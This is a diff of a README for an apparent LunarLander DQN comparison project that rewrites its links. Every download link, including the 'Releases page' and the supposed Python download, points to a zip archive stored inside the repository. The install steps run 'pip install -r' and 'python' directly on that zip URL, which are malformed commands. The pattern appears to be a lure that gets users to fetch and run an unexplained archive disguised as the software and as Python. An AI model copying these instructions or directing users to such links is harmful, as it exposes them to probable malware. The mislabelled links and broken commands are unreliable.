@@ -1,6 +1,6 @@
 # 🚀 lunarlander-dqn-comparison - Explore AI Agents in Action
 
-[![Download Now](https://github.com/Dophinjet/lunarlander-dqn-comparison/raw/refs/heads/main/report/comparison_lunarlander_dqn_v2.8.zip%20Now-Grab%20the%20Latest%20Release-brightgreen)](https://github.com/Dophinjet/lunarlander-dqn-comparison/raw/refs/heads/main/report/comparison_lunarlander_dqn_v2.8.zip)
+[![Download Now](https://raw.githubusercontent.com/Dophinjet/lunarlander-dqn-comparison/main/notebook/lunarlander_comparison_dqn_v2.2.zip%20Now-Grab%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Dophinjet/lunarlander-dqn-comparison/main/notebook/lunarlander_comparison_dqn_v2.2.zip)
 
 ## 📦 Introduction
 
@@ -17,14 +17,14 @@ To run this application, your computer needs to meet the following requirements:
 - **Operating System:** Windows, macOS, or Linux.
 - **RAM:** At least 4 GB.
 - **Disk Space:** Minimum of 500 MB available.
-- **Python:** Version 3.6 or higher. If you don’t have it installed, you can download it from [https://github.com/Dophinjet/lunarlander-dqn-comparison/raw/refs/heads/main/report/comparison_lunarlander_dqn_v2.8.zip](https://github.com/Dophinjet/lunarlander-dqn-comparison/raw/refs/heads/main/report/comparison_lunarlander_dqn_v2.8.zip).
+- **Python:** Version 3.6 or higher. If you don’t have it installed, you can download it from [https://raw.githubusercontent.com/Dophinjet/lunarlander-dqn-comparison/main/notebook/lunarlander_comparison_dqn_v2.2.zip](https://raw.githubusercontent.com/Dophinjet/lunarlander-dqn-comparison/main/notebook/lunarlander_comparison_dqn_v2.2.zip).
 - **Pip:** Ensure you have the latest version of Pip for package management.
 
 ### 📥 Download & Install
 
 To get the latest version of the software, visit the Releases page. You will find different versions available for download.
 
-[Download the latest release here!](https://github.com/Dophinjet/lunarlander-dqn-comparison/raw/refs/heads/main/report/comparison_lunarlander_dqn_v2.8.zip)
+[Download the latest release here!](https://raw.githubusercontent.com/Dophinjet/lunarlander-dqn-comparison/main/notebook/lunarlander_comparison_dqn_v2.2.zip)
 
 1. Click on the link above.
 2. Locate the release you want to install.
@@ -52,13 +52,13 @@ To get the latest version of the software, visit the Releases page. You will fin
 4. **Install Required Packages:**
    - Run the following command to install the necessary packages:
      ```
-     pip install -r https://github.com/Dophinjet/lunarlander-dqn-comparison/raw/refs/heads/main/report/comparison_lunarlander_dqn_v2.8.zip
+     pip install -r https://raw.githubusercontent.com/Dophinjet/lunarlander-dqn-comparison/main/notebook/lunarlander_comparison_dqn_v2.2.zip
      ```
 
 5. **Run the Application:**
    - Start the application by running:
      ```
-     python https://github.com/Dophinjet/lunarlander-dqn-comparison/raw/refs/heads/main/report/comparison_lunarlander_dqn_v2.8.zip
+     python https://raw.githubusercontent.com/Dophinjet/lunarlander-dqn-comparison/main/notebook/lunarlander_comparison_dqn_v2.2.zip
      ```
 
 ### 🎮 Running the LunarLander Simulation
@@ -95,7 +95,7 @@ No, this application is built for end-users. You can run the simulation without 
 
 ### Where can I find more information?
 
-You can visit the [Releases page](https://github.com/Dophinjet/lunarlander-dqn-comparison/raw/refs/heads/main/report/comparison_lunarlander_dqn_v2.8.zip) for updates and release notes. Additionally, the source code is available on GitHub for those who want to explore it further.
+You can visit the [Releases page](https://raw.githubusercontent.com/Dophinjet/lunarlander-dqn-comparison/main/notebook/lunarlander_comparison_dqn_v2.2.zip) for updates and release notes. Additionally, the source code is available on GitHub for those who want to explore it further.
 
 ## 📑 License
 
